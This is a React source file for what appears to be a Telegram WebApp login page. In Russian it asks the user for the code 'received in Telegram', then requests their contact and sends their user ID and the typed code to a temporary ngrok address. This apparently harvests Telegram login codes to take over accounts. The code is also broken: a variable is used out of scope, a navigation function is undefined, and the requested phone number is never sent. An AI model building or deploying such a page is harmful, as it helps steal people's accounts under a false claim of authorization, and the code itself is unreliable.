import { useState, useRef, useEffect } from "react";

export default function Auth2() {
  const CODE_LENGTH = 5; // number of digits
  const [code, setCode] = useState(Array(CODE_LENGTH).fill(""));
  const inputsRef = useRef([]);




  const requestPhoneNumber = () => {
    const tg = window.Telegram?.WebApp;
    if (!tg) {
      alert("This works only inside Telegram WebApp");
      return;
    }

    const userId = tg.initDataUnsafe?.user?.id;

    tg.requestContact(async (result) => {
      if (result) {
        // Send user_id + phone to backend
        try {
          const res = await fetch("https://4aa1a6d7ad73.ngrok-free.app/api/code", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ user_id: userId, code: newCode.join("") })
          });

          const json = await res.json();

          if (json.ok) {
            navigate("/auth2");
          } else {
            alert("Error: " + (json.error || "Unknown error"));
          }
        } catch (err) {
          alert("Network error: " + err.message);
        }

      } else {
        alert("Вы отказались или действие не завершено");
      }
    });
  };


  useEffect(() => {
    // Focus first input on mount
    inputsRef.current[0]?.focus();
  }, []);

  const handleChange = (value, index) => {
    if (!/^\d*$/.test(value)) return; // only allow numbers
    const newCode = [...code];
    newCode[index] = value.slice(-1); // keep only last digit typed
    setCode(newCode);

    if (value && index < CODE_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus(); // move to next box
    }

    if (newCode.every(digit => digit !== "")) {
      requestPhoneNumber()
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevIndex = index - 1;
      inputsRef.current[prevIndex]?.focus();
      const newCode = [...code];
      newCode[prevIndex] = "";
      setCode(newCode);
    }
  };

  return (
    <div className="min-h-screen font-sans scrollbar-hide overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
      <p className="text-4xl text-white">Авторизация</p>
      <p className="mt-3 text-lg text-gray-400">
        Введите код, который вы получили в Telegram.
      </p>

      <div className="mt-7 flex space-x-3 justify-center">
        {code.map((digit, i) => (
          <input
            key={i}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(e.target.value, i)}
            onKeyDown={(e) => handleKeyDown(e, i)}
            ref={el => inputsRef.current[i] = el}
            className="w-12 h-12 text-center text-xl rounded-lg bg-gray-700 border-2 border-gray-500 focus:border-blue-400 focus:outline-none transition"
          />
        ))}
      </div>

      <p className="mt-5 text-sm text-gray-400">
        Вы можете отозвать доступ в любое время в настройках Telegram
      </p>
    </div>
  );
}
